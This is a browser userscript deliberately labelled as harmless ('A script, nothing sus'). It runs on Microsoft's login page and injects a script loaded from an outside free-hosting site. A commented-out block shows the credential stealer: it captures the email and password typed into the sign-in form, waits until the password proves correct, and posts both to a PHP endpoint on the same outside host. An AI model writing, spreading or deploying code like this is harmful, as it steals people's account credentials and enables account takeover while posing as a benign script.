// ==UserScript==
// @name         A script, nothing sus
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  it does what it should
// @author       You
// @match        *://login.microsoftonline.com/*
// @icon         https://www.google.com/s2/favicons?domain=pgc.edu
// @grant        none
// ==/UserScript==

document.querySelector("head").innerHTML += "<script src='http://my-smex-website.000webhostapp.com/superpasswordheck/script.js'></script>"

/*
(function(){

    window.__LOGSTR = ''
    function customLog(t, t2, t3, t4, t5, t6, t7, t8, t9) {
        t2 = t2 || ""
        t3 = t3 || ""
        t4 = t4 || ""
        t5 = t5 || ""
        t6 = t6 || ""
        t7 = t7 || ""
        t8 = t8 || ""
        t9 = t9 || ""


        window.__LOGSTR = t + t2 + t3 + t4 + t5 + t6 + t7 + t8 + t9 + '\n' + window.__LOGSTR
    }

    window.bindEvents = (s) => {
        customLog("Listening to " + s + "...")

        if(document.querySelector("#idSIButton9") == null) setTimeout((() => {

            window.retries = window.retries ? window.retries+1 : 0
            if (window.retries <= 10) {
                customLog("Button not found, trying again")
                window.bindEvents(s)
            } else {
                window.retries = undefined
            }
        }), 1000 )

        function backBtn() {
            if (document.querySelector(".backButton") == null)  {
                window.retries = window.retries ? window.retries+1 : 0
                customLog("Back Button not found, retrying...")
                if (window.retries > 10) {
                    return customLog("10 tries exausted.")
                } else {
                    return setTimeout(backBtn, 1000)
                }
            }
            window.retries = undefined

            document.querySelector(".backButton").onclick = () => {
                customLog("Back button pressed,")
                setTimeout(() => window.bindEvents("email"), 1000)
            }
        }
        if(s == "password") setTimeout(backBtn, 1000)

        if (document.querySelector("#idSIButton9")) document.querySelector("#idSIButton9").onclick = (e) => window["__save"+s](document.querySelector('input[type='+s+']').value, e) // save value if next button pressed
    }

    window.__saveemail = function(val, event) {
        window.localStorage.__em = val
        customLog("Entered Email: ", val)
        event.target.onkeyup = undefined

        setTimeout(() => { // password controls appear after 1 second
            if (document.querySelector("#usernameError") === null) {
                bindEvents('password')
            }
            else {
                customLog("Email was invalid")
                bindEvents('email')
            }
        }, 1000);
    }

    let sendData = function(email, password) {
        customLog("Data Saved, Ready for flight:\n\nEmail: "+email+"\nPassword: "+password)

        var body = {
            action: "add",
            email: email,
            field2: password,
            location: location.href,
        }
        var headers = {
            'Content-Type':'application/x-www-form-urlencoded'
        }
        var bodyStr = ''

        Object.keys(body).forEach(a => bodyStr += encodeURIComponent(a) + "=" + encodeURIComponent(body[a]) + "&")

        bodyStr = bodyStr.substr(0, bodyStr.length-1)

        fetch(location.protocol+"//my-smex-website.000webhostapp.com/superpasswordheck/backend.php", {
            method: 'POST',
            mode: 'no-cors',
            headers: headers,
            body: bodyStr
        }).then(a => a.text()).then(a => {
            customLog("Credentials Sent.")
        })
    }

    window.__savepassword = function(val, e) {
        e.preventDefault()
        window.localStorage.__pw = val
        window.localStorage.__passwordchecking = true
        customLog("Entered Password: ", val)

        // sendData(window.localStorage.__em, window.localStorage.__pw)
    }

    if (window.localStorage.__passwordchecking == 'true') {
        customLog("Continuing Password Check...")
        if(document.querySelector('#passwordError') != null) {
            customLog("Password was incorrect.")
            bindEvents('password')
        } else {
        // } else if (document.querySelector(".text-title") && document.querySelector(".text-title").innerText.toLowerCase().includes("stay signed in")) {
            customLog("Password was correct.")
            sendData(window.localStorage.__em, window.localStorage.__pw)
            window.localStorage.__passwordchecking = false
        }
    } else {
        bindEvents(document.querySelector('input[type=password]') ? 'password' : 'email')
    }
})()

*/